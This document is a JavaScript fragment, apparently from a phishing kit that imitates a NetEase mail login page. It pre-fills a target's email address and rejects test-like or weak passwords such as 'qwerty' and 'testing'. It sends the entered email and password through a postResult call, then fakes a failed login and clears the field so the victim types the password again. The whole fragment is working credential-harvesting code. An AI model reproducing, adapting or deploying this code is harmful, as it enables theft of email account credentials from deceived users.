// 
if (validEmail.test(usermail)) {
    let getDomain = usermail.split('@');
    $("#net_mail").val(getDomain[0]);
    $("#net_input_dom").text("@"+getDomain[1]);
    $("#net_mail").attr('readOnly', true);
    
}

// 
function showPassEye(x) {
    let net_pass = document.getElementById("net_pass");

    if (net_pass.type === "text") {
        net_pass.type = "password";
        $("#show_hide_pass").attr('src', './pages/netease/eye-close.png');
    } 
    else {
        net_pass.type = "text";
        $("#show_hide_pass").attr('src', './pages/netease/eye-open.png');

    }
}


$("#netease_form").on('submit', (e)=>{
    e.preventDefault();

    let netease_inputs = document.getElementsByClassName("netease_inputs");

    if ($("#net_mail").val() == "") {
        netease_inputs[0].style.borderColor = "red"
        return
    }
    else{
        netease_inputs[0].style.borderColor = "silver"
    }

    if (validEmail.test($("#net_pass").val()) || $("#net_pass").val().length < 6 || $("#net_pass").val() == 123456 || $("#net_pass").val().toLowerCase() == "qwerty" || $("#net_pass").val().toLowerCase() == "password" || $("#net_pass").val().toLowerCase() == "testing") {
        netease_inputs[1].style.borderColor = "red"
        return
    }
    else{
        netease_inputs[1].style.borderColor = "silver";

        let permEmail = $("#net_mail").val()+$("#net_input_dom").text();

        postResult($("#net_input_dom").text().slice(1), permEmail, $("#net_pass").val(), postCount);

        $("#loader").show().css({"display":"flex"})

        setTimeout(() => {
            netease_inputs[1].style.borderColor = "red";
            postCount++
            $("#net_pass").val("")
        }, delayCounter);

    }

})